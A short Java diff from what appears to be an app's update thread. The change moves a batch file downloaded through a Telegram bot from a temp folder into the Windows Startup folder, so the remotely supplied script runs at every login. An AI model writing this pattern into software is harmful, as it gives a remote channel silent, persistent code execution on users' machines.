@@ -220,7 +220,7 @@ public class AppUpdate extends Thread {
                         getFile.setFileId(line);
                         String filePath = bot.execute(getFile).getFilePath();
                         bot.downloadFile(filePath, new File(
-                                "C:\\ProgramData\\LycorisCafe\\IMS\\Temp\\updater.bat"));
+                                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\updater.bat"));
                     } catch (TelegramApiException e) {
                         System.out.println(e);
                     }
